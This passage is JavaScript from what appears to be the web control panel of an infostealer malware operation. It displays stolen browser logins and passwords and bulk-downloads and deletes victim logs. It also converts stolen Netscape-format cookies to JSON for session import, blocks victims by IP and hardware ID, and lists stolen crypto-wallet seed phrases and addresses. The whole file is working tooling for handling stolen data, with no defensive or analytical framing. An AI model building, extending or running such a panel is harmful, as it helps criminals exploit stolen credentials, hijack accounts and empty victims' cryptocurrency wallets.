    </div>
    
    <table id="PasswordsModalTable" class="table text-nowrap mb-0 align-middle" style="word-break: break-word;">
		<thead>
			<tr>
				<th scope="col">browser</th>
				<th scope="col">profile</th>
				<th scope="col">url</th>
				<th scope="col">login</th>
				<th scope="col">password</th>
			</tr>
		</thead>
		<tbody>
    `;

    data.forEach(function(line) 
    {
        html += `
            <tr>
                <td nowrap>
                    <img src="assets/images/summary/browsers/${line.soft}.png" height="18" class="align-middle me-1" />
                    <h6 class="fs-4 fw-semibold mb-0 d-inline align-middle">${line.soft}</h6>
                </td>
                <td nowrap><h6 class="fs-4 fw-semibold mb-0">${line.profile}</h6></td>
                <td nowrap><a class="fs-4 fw-semibold mb-0" href="${line.full_path}" target="_blank">${line.url}</a></td>
                <td>
                    <div class="form-group">
                        <input type="text" class="form-control" id="readonly" value="${line.login}" readonly onclick="this.select()">
                    </div>
                </td>
                <td>
                    <div class="form-group">
                        <input type="text" class="form-control" id="readonly" value="${line.password}" readonly onclick="this.select()">
                    </div>
                </td>
            </tr>
        `;
    });

    html += `
    </tbody>
		</table>
		
		<br><br>
	<div class="row">
		<div class="col-sm-12 col-md-10">
			<div style="float: left; text-align: right; margin-left: 10px; margin-right: 16px; margin-top: -20px;" >
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><g fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M12 17v-6"/><circle cx="1" cy="1" r="1" fill="currentColor" transform="matrix(1 0 0 -1 11 9)"/></g></svg> 
                if login and password fields are empty, this means that the user has marked the site as "Do not save on this site"
			</div>
		</div>
	</div>
    `;


    return html;
}

/**
 * DownloadSelected
 *
 * 
 *
 * @return none
 */
function DownloadSelected()
{
    let selectedIds = [];

    $(".checkbox-select-log:checked").each(function() 
    {
        selectedIds.push($(this).val());
    });

    if (selectedIds.length === 0) 
    {
        alert("No selected logs for download.");
        return;
    }

    $("#download_status").text("Start archive generation, wait...");
    $("#modal_download_link").hide();
    
    var modal_download_logs = new bootstrap.Modal(document.getElementById('modal_download_logs'), 
    {
        backdrop: 'static',
        keyboard: false
    });

    modal_download_logs.show();

    $.ajax(
    {
        url: "api/download",
        type: "POST",
        contentType: "application/json",
        data: JSON.stringify({ ids: selectedIds }),
        dataType: "json",
        success: function(response) 
        {
            if (response.success) 
                {
                    let token = response.token;
                    pollDownloadStatus(token);
                } 
                else 
                {
                    $("#download_status").text("Error: " + response.error);
                }
        },
        error: function(xhr, status, error) 
        {
            $("#download_status").text("An error occurred while starting archive generation.");
        }
    });
}

/**
 * pollDownloadStatus
 *
 * 
 *
 * @return none
 */
function pollDownloadStatus(token) 
{
    let interval = setInterval(function() 
    {
        $.ajax({
            url: "api/download",
            type: "GET",
            data: { token: token },
            dataType: "json",
            success: function(response) 
            {
                if (response.success) 
                {
                    let status = response.status;
                    
                    if (status === "ready") 
                    {
                        $("#download_status").text("Arhive aviable to download.");
                        $("#modal_download_link").attr("href", response.download_url).show();
                        $("#download_spinner").hide();
                        clearInterval(interval);
                    }
                    else if(status === "finishing")
                    {
                        $("#download_status").text("Writing to disk...");
                    }
                    else if (status === "error") 
                    {
                        $("#download_status").text("Error generating archive.");
                        clearInterval(interval);
                    } 
                    else 
                    {
                        $("#download_status").text(response.progress_message);
                    }
                } 
                else 
                {
                    $("#download_status").text("Error: " + response.error);
                    clearInterval(interval);
                }
            },
            error: function(xhr, status, error) 
            {
                $("#modalStatus").text("Error checking archive status.");
                clearInterval(interval);
            }
        });
    }, 5000);
}

/**
 * DeleteSelected
 *
 * 
 *
 * @return none
 */
function DeleteSelected()
{
    var selectedLogs = $('input.checkbox-select-log:checked').map(function() 
    {
        return $(this).val();
    }).get().join(',');

    //DeleteLogs(selectedLogs);

    if(selectedLogs.length > 0)
    {
        var html = `
        <div class="card w-100">
            <div class="card-body">
                <div class="alert alert-danger text-danger" role="alert">
                    <strong>Warning - </strong> Remote Logs Cannot be Recovered!
                </div>

                <h6 class="card-title">Logs to Delete: </h6>
                <h6>${selectedLogs}</h6>
            </div>
        </div>`;

        $('#modal_delete_logs .modal-body-delete-logs').html(html);

        var deleteLogsButton = document.querySelector('#modal_delete_logs .modal-footer .btn.bg-danger-subtle');

        deleteLogsButton.addEventListener('click', function () 
        {
            $.post('api/logs', 
            { 
                method: 'delete_logs',
                logs: selectedLogs
            },
            function(response) 
            {
                $('#modal_delete_logs .modal-footer').html(`<button type="button" class="btn bg-light" data-bs-dismiss="modal">Close</button>`);

                var html = `
                <div class="card w-100">
                    <div class="card-body">
                        <table class="table text-nowrap mb-0 align-middle">
                            <thead class="text-dark fs-4">
                                <tr>
                                    <th>
                                        <h6 class="fs-4 fw-semibold mb-0">Status</h6>
                                    </th>
                                    <th>
                                        <h6 class="fs-4 fw-semibold mb-0">Message</h6>
                                    </th>
                                </tr>
                            </thead>
                            <tbody>`;

                response.forEach(item => 
                {
                    html += `
                    <tr><td>
                        ${item.status === 'success'
                        ? '<span class="mb-1 badge text-bg-success">Success</span>'
                        : '<span class="mb-1 badge text-bg-danger">Error</span>'}</td>
                        <td><p>${item.message}</p></td>
                    </tr>
                    `;
                });

                html += `</tbody>
                        </table>
                    </div>
                </div>
                `;

                $('#modal_delete_logs .modal-body-delete-logs').html(html);
                LoadData();
                table.draw();
            }, 'json');
        }, { once: true });

        var modal_delete_logs = new bootstrap.Modal(document.getElementById('modal_delete_logs'), 
        {
            backdrop: 'static',
            keyboard: false
        });

        modal_delete_logs.show();
    }
}

/**
 * deleteLog
 *
 * 
 *
 * @return none
 */
function deleteLog(log_id)
{
    var modal_delete_log = new bootstrap.Modal(document.getElementById('modal_delete_log'), 
    {
        backdrop: 'static',
        keyboard: false
    });

    var html = `
    <div class="card w-100">
        <div class="card-body">
            <h6 class="card-title">Delete Log #${log_id}?</h6>
        </div>
    </div>`;

    $('#modal_delete_log .modal-body-delete-log').html(html);

    var deleteLogsButton = document.querySelector('#modal_delete_log .modal-footer .btn.bg-danger-subtle');

    deleteLogsButton.addEventListener('click', function () 
    {
        $.post('api/logs', 
        { 
            method: 'delete_logs',
            logs: log_id
        },
        function(response) 
        {
            $('#modal_delete_log .modal-footer').html(`<button type="button" class="btn bg-light" data-bs-dismiss="modal">Close</button>`);

            var html = `
            <div class="card w-100">
                <div class="card-body">
                    <table class="table text-nowrap mb-0 align-middle">
                        <thead class="text-dark fs-4">
                            <tr>
                                <th>
                                    <h6 class="fs-4 fw-semibold mb-0">Status</h6>
                                </th>
                                <th>
                                    <h6 class="fs-4 fw-semibold mb-0">Message</h6>
                                </th>
                            </tr>
                        </thead>
                        <tbody>`;

            response.forEach(item => 
            {
                html += `
                <tr><td>
                    ${item.status === 'success'
                    ? '<span class="mb-1 badge text-bg-success">Success</span>'
                    : '<span class="mb-1 badge text-bg-danger">Error</span>'}</td>
                    <td><p>${item.message}</p></td>
                </tr>
                `;
            });

            html += `</tbody>
                    </table>
                </div>
            </div>
            `;

            $('#modal_delete_log .modal-body-delete-log').html(html);
            LoadData();
            table.draw();
        }, 'json');
    }, { once: true });

    modal_delete_log.show();
}

/**
 * checkDownloadsModal
 *
 * 
 *
 * @return none
 */
function checkDownloadsModal(open_modal)
{
    $.post('api/logs', 
    { 
        method: 'get_downloads'
    },
    function(response) 
    {
        var tbody = $("#downloadsTable tbody");
        tbody.empty();

        if (response.success) 
        {
            response.data.forEach(function(item) 
            {
                var row = $("<tr></tr>");

                row.append($("<td></td>").text(item.id));
                row.append($("<td></td>").text(item.token));

                var statusHtml = '';

                switch(item.status)
                {
                    case "ready":
                        statusHtml = '<span class="mb-1 badge text-bg-primary">Ready</span>';
                        break;
                    case "finishing":
                        statusHtml = '<span class="mb-1 badge text-bg-warning">Writing...</span>';
                        break;

                    case "error":
                        statusHtml = '<span class="mb-1 badge text-bg-danger">Error</span>';
                        break;

                    default:
                        statusHtml = '<span class="mb-1 badge text-bg-danger">Unknown</span>';
                        break;
                }

                row.append($("<td></td>").html(statusHtml));
                row.append($("<td></td>").text(item.total_files));
                row.append($("<td></td>").text(item.created_at));
                    
                var actions = `
                
                    <div class="btn-group">
                        <button class="btn btn-primary dropdown-toggle" type="button" id="dropdownMenuButton" data-bs-toggle="dropdown" aria-expanded="false">Actions</button>
                        <ul class="dropdown-menu" aria-labelledby="dropdownMenuButton" style="">
                            <li>
                                <a class="dropdown-item" href="${item.download_url}">Download</a>
                            </li>
                            <li>
                                <hr class="dropdown-divider">
                            </li>
                            <li>
                                <a class="dropdown-item" style="cursor: pointer;" onclick="deleteDownload(${item.id});">Delete</a>
                            </li>
                        </ul>
                    </div>
                `;
                    
                row.append($("<td></td>").html(actions));
                tbody.append(row);
            });
        }
        else 
        {
            var errorRow = $("<tr></tr>");
            errorRow.append($("<td colspan='8'></td>").text("Error: " + response.error));
            tbody.append(errorRow);
        }

        if(open_modal)
        {
            var modal_downloads = new bootstrap.Modal(document.getElementById('modal_downloads'), 
            {
                backdrop: 'static',
                keyboard: false
            });
            modal_downloads.show();
        }
    }, 'json' );
}

/**
 * deleteDownload
 *
 * 
 *
 * @return none
 */
function deleteDownload(download_id)
{
    $.post('api/logs', 
    { 
        method: 'delete_download',
        download_id: download_id
    },
    function(response) 
    {
        if (response.success)
        {
            toastr.info("Download task deleted!");
            checkDownloadsModal(false);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json');
}

/**
 * downloadFromLog
 *
 * 
 *
 * @return none
 */
function downloadFromLog(log_filename, file) 
{
    var url = `api/logs?method=download_from_log&log=${encodeURIComponent(log_filename)}&filename=${encodeURIComponent(file)}`;
    
    $.ajax(
    {
        url: url,
        method: 'GET',
        xhrFields: 
        {
            responseType: 'blob'
        },
        success: function(data) 
        {
            saveAs(data, file);
        },
        error: function() 
        {
            toastr.warning("Error: server not return file");
        }
    });
}

/**
 * ConvertCookie
 *
 * Convert cookie from netscape to json format and return transformed file
 *
 * @return none
 */
function ConvertCookie(log_filename, file)
{
    var url = `api/logs?method=download_from_log&log=${encodeURIComponent(log_filename)}&filename=${encodeURIComponent(file)}`;
    
    $.ajax(
    {
        url: url,
        method: 'GET',
        xhrFields: 
        {
            responseType: 'text'
        },
        success: function(data) 
        {
            var arrObjects = [];
            var arrayOfLines = data.split("\n"); 
            var i = 0;
            
            for (i=0; i < arrayOfLines.length; i++)
            {
                var kuka = arrayOfLines[i].split("\t"); 
                var cook = new Object();
                
                cook.domain = kuka[0];
                cook.expirationDate = parseInt(kuka[4]);

                if (kuka[1] == "FALSE") cook.httpOnly = false;  
                if (kuka[1] == "TRUE") cook.httpOnly = true;  

                cook.name = kuka[5];
                cook.path = kuka[2];
                    
                if (kuka[3] == "FALSE") cook.secure = false;  
                if (kuka[3] == "TRUE") cook.secure = true; 

                cook.value = kuka[6];  
                
                arrObjects[i] = cook;		
            }
            
            var cookieStr = JSON.stringify(arrObjects);
            var converted_name = "converted_" + file;
            
            var blob = new Blob([cookieStr], {type: "text/plain;charset=utf-8"});
            saveAs(blob, converted_name);
        },
        error: function() 
        {
            toastr.warning("Error: server not return file");
        }
    });
}

/**
 * blockLog
 *
 * block log ip and hwid
 *
 * @return none
 */
function blockLog(hwid, ip)
{
    var block_log_modal = new bootstrap.Modal(document.getElementById('block_log_modal'), 
    {
        backdrop: 'static',
        keyboard: false
    });

    document.getElementById("block_rule_ip").innerText  = ip;
    document.getElementById("block_rule_hwid").innerText  = hwid;

    block_log_modal.show();

    var modal_block_button = document.querySelector('#modal_block_button');

    modal_block_button.addEventListener('click', function () 
    {
        $.post('api/blocklist', 
        { 
            method: 'block_log',
            rule_ip: ip,
            rule_hwid: hwid
        },
        function(response) 
        {
            if (response.success)
            {
                block_log_modal.hide();
                toastr.info(response.success);
            }
            else
            {
                toastr.warning(response.error);
            }
        }, 'json');
    }, { once: true });
}

function viewMnemonicList(log_id)
{
    $.post('api/logs', 
    { 
        method: 'get_mnemonic',
        log_id: log_id
    },
    function(response) 
    {
        if(response.error) 
        {
            $('#modal_mnemonic .modal-body-mnemonic').html('<p>' + response.error + '</p>');
        } 
        else 
        {
            var tableHtml = generateTableMnemonic(response);
            $('#modal_mnemonic .modal-body-mnemonic').html(tableHtml);
        }

        document.getElementById("mnemonic_modal_header").innerHTML = "Mnemonic List from Log #" + log_id;
            
        var modal_mnemonic = new bootstrap.Modal(document.getElementById('modal_mnemonic'), 
        {
            backdrop: 'static',
            keyboard: false
        });
        modal_mnemonic.show();

    }, 'json');
}

function generateTableMnemonic(data)
{
    if (Object.keys(data).length === 0) 
    {
        return '<p>Error no data</p>';
    }

    var html = '<table class="table table-bordered">';
    html += `<thead>
        <tr>
            <th><h6 class="fs-4 fw-semibold mb-0">Wallet</h6></th>
            <th><h6 class="fs-4 fw-semibold mb-0">Browser</h6></th>
            <th><h6 class="fs-4 fw-semibold mb-0">Profile</h6></th>
            <th><h6 class="fs-4 fw-semibold mb-0">Mnemonic</h6></th>
            <th><h6 class="fs-4 fw-semibold mb-0">Address</h6></th>
            <th><h6 class="fs-4 fw-semibold mb-0">Networks Added</h6></th>
        </tr></thead>`;
    html += '<tbody>';

    const log_info = data["log_info"];

    for (const pluginName in log_info.plugins)
    {
        const plugin = log_info.plugins[pluginName];

        for (const browserName in plugin) 
        {
            if (browserName === "count") continue;
            const profiles = plugin[browserName];
        
            for (const profileName in profiles) 
            {
                const profile = profiles[profileName];

                if(profile.mnemonic)
                {
                    html += `
                    <tr>
                        <td><h6 class="fs-4 fw-semibold mb-0"><img src="assets/images/summary/plugins/${pluginName}.jpg" height="18" title="${pluginName}"> ${pluginName}</h6></td>
                        <td><img src="assets/images/summary/browsers/${browserName}.png" height="18" class="align-middle me-1"><h6 class="fs-4 fw-semibold mb-0 d-inline align-middle">${browserName}</h6></td>
                        <td><h6 class="fs-4 fw-semibold mb-0 d-inline align-middle">${profileName}</h6></td>
                        <td><mark><code>${profile.mnemonic}</code></mark></td>
                        <td><mark><code>${profile.address}</code></mark></td>
                        <td>${profile.networks_added}</td>
                    </tr>
                    `;
                }
            }
          }
    }

    html += `</tbody></table>`;

    return html;
}